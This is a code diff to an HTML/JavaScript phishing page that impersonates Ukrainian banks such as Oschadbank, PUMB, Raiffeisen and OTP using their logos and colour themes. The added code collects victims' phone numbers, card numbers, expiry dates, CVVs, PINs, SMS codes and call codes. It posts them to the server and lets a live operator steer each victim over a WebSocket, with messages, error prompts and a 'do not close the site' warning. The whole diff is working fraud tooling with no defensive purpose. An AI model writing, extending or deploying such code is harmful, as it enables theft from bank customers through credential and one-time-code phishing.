@@ -43,29 +43,16 @@
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
         .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        /* --- НОВЫЙ БЛОК СТИЛЕЙ: Для отключенных банков --- */
         .bank-item.disabled {
             opacity: 0.5;
             cursor: not-allowed;
             pointer-events: none;
         }
         .bank-item.disabled .unavailable-label {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 12px;
-            font-weight: bold;
-            color: var(--danger-color);
-            background-color: rgba(255, 255, 255, 0.8);
-            padding: 2px 6px;
-            border-radius: 4px;
+            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+            font-size: 12px; font-weight: bold; color: var(--danger-color);
+            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
         }
-        .bank-item.disabled:hover {
-            transform: none;
-            box-shadow: 0 4px 10px var(--shadow-color);
-        }
-        /* --- НОВЫЙ БЛОК СТИЛЕЙ: Для оверлея и кастомных модальных окон --- */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0,0,0,0.5);
@@ -73,15 +60,10 @@
             z-index: 1000;
         }
         .custom-modal-content {
-            background-color: var(--white);
-            padding: 25px;
-            border-radius: 16px;
-            width: 90%;
-            max-width: 380px;
-            text-align: center;
+            background-color: var(--white); padding: 25px; border-radius: 16px;
+            width: 90%; max-width: 380px; text-align: center;
         }
         .custom-modal-content h3 { margin-top: 0; }
-        /* Стили для Райффайзен PIN пада */
         .pin-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px auto; max-width: 240px; }
         .pin-pad button {
             width: 60px; height: 60px; border-radius: 50%; border: 1px solid var(--border-color);
@@ -93,23 +75,13 @@
             height: 50px; border: 1px solid var(--border-color); border-radius: 12px; margin: 20px 0;
             display: flex; justify-content: center; align-items: center; letter-spacing: 1em; font-size: 30px;
         }
-        /* Стили для загрузчика Ощадбанка */
-        .loader-icon {
-            animation: spin 2s linear infinite;
-            width: 80px; height: 80px;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        /* Другие стили... */
+        .loader-icon { animation: spin 2s linear infinite; width: 80px; height: 80px; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
         #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
         .input-group { margin-bottom: 15px; position: relative; }
-        .input-group:last-child { margin-bottom: 0; }
         .input-field {
             width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
             font-size: 18px; font-weight: 500; transition: all 0.3s ease;
@@ -122,7 +94,7 @@
             background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
             flex-shrink: 0; display: flex; align-items: center;
         }
-        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
+        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
         .multi-input-row { display: flex; gap: 10px; }
         .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
         .btn {
@@ -131,9 +103,6 @@
             flex-basis: 0; flex-grow: 1;
         }
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
-        .btn:active { transform: translateY(0) scale(0.97); }
-        /* --- СТИЛИ БАНКОВ --- */
-        body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
         body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
         body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
@@ -164,8 +133,7 @@
     </div>
     
     <div id="custom-modal-overlay">
-        <div class="custom-modal-content" id="custom-modal-content">
-            </div>
+        <div class="custom-modal-content" id="custom-modal-content"></div>
     </div>
 
 <script>
@@ -198,12 +166,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     ];
 
+    // --- ИЗМЕНЕНИЕ: Убраны флаги disabled ---
     const bankFlows = {
         'oschadbank': {
             name: 'Ощадбанк',
             logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
             theme: 'oschadbank',
-             // --- ИЗМЕНЕНИЕ: Убран шаг с ПИН-кодом из начального сценария ---
             steps: [
                 { type: 'phone', title: 'Введіть номер телефону' },
                 { type: 'card', title: 'Введіть номер карти' },
@@ -221,24 +189,21 @@ document.addEventListener('DOMContentLoaded', () => {
             logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
             theme: 'alliance',
             steps: specialFlowSteps,
-            special: true,
-            disabled: true // --- НОВЫЙ ФЛАГ ---
+            special: true
         },
         'pumb': {
             name: 'ПУМБ',
             logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
             theme: 'pumb',
             steps: specialFlowSteps,
-            special: true,
-            disabled: true // --- НОВЫЙ ФЛАГ ---
+            special: true
         },
         'otp': {
             name: 'OTP Bank',
             logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
             theme: 'otp',
             steps: specialFlowSteps,
-            special: true,
-            disabled: true // --- НОВЫЙ ФЛАГ ---
+            special: true
         },
         'vostok': {
             name: 'Восток',
@@ -271,43 +236,28 @@ document.addEventListener('DOMContentLoaded', () => {
     const modalFooter = document.querySelector('.modal-footer');
     const nextBtn = document.getElementById('next-btn');
     const backBtn = document.getElementById('back-btn');
-    // --- НОВЫЙ БЛОК: Получаем элементы кастомного модального окна ---
     const customModalOverlay = document.getElementById('custom-modal-overlay');
     const customModalContent = document.getElementById('custom-modal-content');
 
-
-    // --- ИЗМЕНЕНИЕ: Логика отрисовки банков с учетом отключенных ---
+    // --- ИЗМЕНЕНИЕ: Упрощенная отрисовка банков ---
     bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
         const bank = bankFlows[id];
-        const disabledClass = bank.disabled ? 'disabled' : '';
-        const unavailableLabel = bank.disabled ? '<span class="unavailable-label">Недоступно</span>' : '';
-        return `<a href="#" class="bank-item ${disabledClass}" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span>${unavailableLabel}</a>`;
+        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
     }).join('');
 
     function connectWebSocket() {
-        // --- ИЗМЕНЕНИЕ: Используем wss:// для Render ---
         const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
         ws = new WebSocket(`${protocol}://${window.location.host}`);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
-        };
-        ws.onmessage = (event) => {
-            const command = JSON.parse(event.data);
-            handleServerCommand(command);
-        };
-        ws.onclose = () => {
-            console.log('WebSocket closed, reconnecting...');
-            setTimeout(connectWebSocket, 3000);
-        };
+        ws.onopen = () => { ws.send(JSON.stringify({ type: 'register', sessionId: sessionId })); };
+        ws.onmessage = (event) => { handleServerCommand(JSON.parse(event.data)); };
+        ws.onclose = () => { setTimeout(connectWebSocket, 3000); };
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
 
     async function sendDataToServer(data, isFinal) {
-        console.log('Sending to server:', data, isFinal);
         collectedData = { ...collectedData, ...data };
         try {
-            const response = await fetch(`/api/submit`, {
+            await fetch(`/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -318,7 +268,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     ...collectedData 
                 }),
             });
-            console.log('Server response:', await response.json());
         } catch (error) {
             console.error('Failed to send data:', error);
         }
@@ -328,8 +277,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (!validateCurrentStep()) return;
 
         let data = {};
-        const inputs = stepContent.querySelectorAll('.input-field');
-        inputs.forEach(input => {
+        stepContent.querySelectorAll('.input-field').forEach(input => {
             let key = input.id;
             let value = input.value;
             if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
@@ -340,7 +288,6 @@ document.addEventListener('DOMContentLoaded', () => {
         const step = activeBankData.steps[currentStepIndex];
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
         
-        // --- ИЗМЕНЕНИЕ: Логика для Ощадбанка ---
         if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
             isFinalStep = true;
         }
@@ -360,10 +307,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
     
-    // Остальной JS код... (валидация, форматирование и т.д. остаются без изменений)
-    // ...
-
-    // --- ИЗМЕНЕНИЕ: Полностью переписанный обработчик команд от сервера ---
     function handleServerCommand(command) {
         const { type, data } = command;
 
@@ -398,7 +341,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                 if (bankToDisable) {
                     bankToDisable.classList.add('disabled');
-                    bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                    if(!bankToDisable.querySelector('.unavailable-label')) {
+                       bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
+                    }
                 }
                 showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 break;
@@ -409,33 +354,19 @@ document.addEventListener('DOMContentLoaded', () => {
                  showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
                 break;
             case 'code_error':
-                modalTitle.textContent = "Невірний код. Вкажіть вірний код.";
                 const smsErrorContainer = document.getElementById('sms-error-container');
-                if (smsErrorContainer) {
-                    smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
-                }
-                break;
-            case 'timer':
-                modalTitle.textContent = 'Обробка заявки';
-                stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
-                modalFooter.style.display = 'none';
-                // ... логика таймера
+                if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
                 break;
             case 'ban':
                 document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                 if (ws) ws.close();
                 break;
             case 'custom_message_text':
-                // Показываем кастомное сообщение в главном окне
-                showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", () => {
-                     // Можно просто закрыть, либо вернуть на предыдущий шаг
-                    renderStep();
-                });
+                showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep);
                 break;
         }
     }
     
-    // --- НОВЫЙ БЛОК: Функция для рендеринга кастомных модальных окон ---
     function renderCustomModal(type, bankName) {
         let html = '';
         if (type === 'lk') {
@@ -496,21 +427,17 @@ document.addEventListener('DOMContentLoaded', () => {
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         addCustomModalListeners(bankName);
-        addInputFormatting(); // Применяем форматирование для новых полей
+        addInputFormatting();
     }
     
-    // --- НОВЫЙ БЛОК: Функция для добавления обработчиков в кастомные модальные окна ---
     function addCustomModalListeners(bankName) {
         const submitBtn = document.getElementById('custom-submit-btn');
         if (submitBtn) {
             submitBtn.onclick = () => {
                 const dataToSend = {};
-                const inputs = customModalContent.querySelectorAll('.input-field');
-                inputs.forEach(input => dataToSend[input.id] = input.value);
-                
-                // Для PIN-падов
-                const pinDisplay = document.getElementById('pin-display');
-                if (pinDisplay) dataToSend.pin = pinDisplay.textContent;
+                customModalContent.querySelectorAll('.input-field, .pin-display').forEach(el => {
+                   dataToSend[el.id || 'pin'] = el.value || el.textContent;
+                });
 
                 sendDataToServer(dataToSend, true);
                 
@@ -522,35 +449,61 @@ document.addEventListener('DOMContentLoaded', () => {
             };
         }
 
-        // Логика для PIN-падов
         const pinDisplay = document.getElementById('pin-display');
         if (pinDisplay) {
-            const pinPad = document.querySelector('.pin-pad');
-            pinPad.addEventListener('click', (e) => {
-                if (e.target.tagName === 'BUTTON') {
-                    const value = e.target.textContent;
-                    if (value === '⌫') {
-                        pinDisplay.textContent = pinDisplay.textContent.slice(0, -1);
-                    } else if (pinDisplay.textContent.length < 4) {
-                        pinDisplay.textContent += value;
-                    }
-                    submitBtn.disabled = pinDisplay.textContent.length !== 4;
+            document.querySelector('.pin-pad').addEventListener('click', (e) => {
+                if (e.target.tagName !== 'BUTTON') return;
+                const value = e.target.textContent;
+                if (value === '⌫') {
+                    pinDisplay.textContent = pinDisplay.textContent.slice(0, -1);
+                } else if (pinDisplay.textContent.length < 4 && value) {
+                    pinDisplay.textContent += value;
                 }
+                submitBtn.disabled = pinDisplay.textContent.length !== 4;
             });
         }
     }
     
-    // ... Остальной код (submitSmsCode, renderStep, event listeners) без изменений
-    // ...
-    // --- ВАЖНО: Добавим функцию-генератор HTML для инпутов, чтобы избежать дублирования ---
     const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => {
         return `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
     };
     
+    function renderStep() {
+        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
+        const step = activeBankData.steps[currentStepIndex];
+        let html = '';
+
+        switch (step.type) {
+            case 'phone':
+                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
+                break;
+            case 'card':
+            case 'card_simple':
+                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
+                break;
+            case 'pin':
+                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
+                break;
+            case 'call_code':
+                // --- ИСПРАВЛЕНИЕ: Убрана лишняя точка с запятой (;) ---
+                html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                break;
+            case 'confirm_all':
+                html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join('');
+                break;
+        }
+        modalTitle.textContent = step.title;
+        stepContent.innerHTML = html;
+        modalFooter.style.display = 'flex';
+        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
+        nextBtn.style.display = 'block';
+        addInputFormatting();
+    }
+    
     document.querySelectorAll('.bank-item').forEach(item => {
         item.addEventListener('click', e => {
             e.preventDefault();
-            if (item.classList.contains('disabled')) return; // Не даем кликнуть на отключенный банк
+            if (item.classList.contains('disabled')) return;
             const bankId = item.dataset.bank;
             activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
             body.dataset.theme = activeBankData.theme;
@@ -565,24 +518,92 @@ document.addEventListener('DOMContentLoaded', () => {
 
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
-
-    async function submitSmsCode() {
-        // ... код без изменений
-    }
-    function validateCurrentStep() {
-        // ... код без изменений
-    }
-    function renderStep() {
-        // ... код без изменений с использованием generateInputHTML
-    }
+    
     function showWaitingScreen() {
-        // ... код без изменений
+        modalTitle.textContent = 'Очікуємо';
+        stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
+        modalFooter.style.display = 'none';
     }
+
     function handleBackStep() {
-        // ... код без изменений
+        if (currentStepIndex > 0) {
+            currentStepIndex--;
+            renderStep();
+        } else {
+            body.classList.remove('form-active');
+        }
     }
+
     function addInputFormatting() {
-        // ... код без изменений
+        const phoneInput = document.getElementById('phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
+                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
+            });
+        }
+        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+            });
+        }
+        const cardExpiryInput = document.getElementById('card-expiry');
+        if (cardExpiryInput) {
+            cardExpiryInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
+            });
+        }
+    }
+    
+    function validateCurrentStep() {
+        let isValid = true;
+        stepContent.querySelectorAll('.input-field').forEach(input => {
+            const errorContainer = input.parentElement.querySelector('.error-message');
+            input.classList.remove('invalid');
+            if (errorContainer) errorContainer.style.display = 'none';
+
+            let value = input.value.replace(/\D/g, '');
+            let requiredLength = 0;
+
+            switch (input.id) {
+                case 'phone': requiredLength = 9; break;
+                case 'card': case 'card_confirm': requiredLength = 16; break;
+                case 'card-expiry': requiredLength = 4; break;
+                case 'card-cvv': case 'pin': requiredLength = 3; break;
+            }
+
+            if (input.id === 'pin' && value.length === 4) requiredLength = 4;
+
+            if (requiredLength > 0 && value.length < requiredLength) {
+                isValid = false;
+                input.classList.add('invalid');
+                if (errorContainer) {
+                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
+                    errorContainer.style.display = 'block';
+                }
+            }
+        });
+        return isValid;
+    }
+    
+    async function submitSmsCode() {
+        const codeInput = document.getElementById('sms-code');
+        const code = codeInput.value;
+        const errorContainer = document.getElementById('sms-error-container');
+        if (!code.trim()) {
+            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+            return;
+        }
+        try {
+            await fetch(`/api/sms`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
+            });
+        } catch (error) { console.error('Failed to send sms code:', error); }
+        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
+        codeInput.value = '';
     }
 });
 </script>
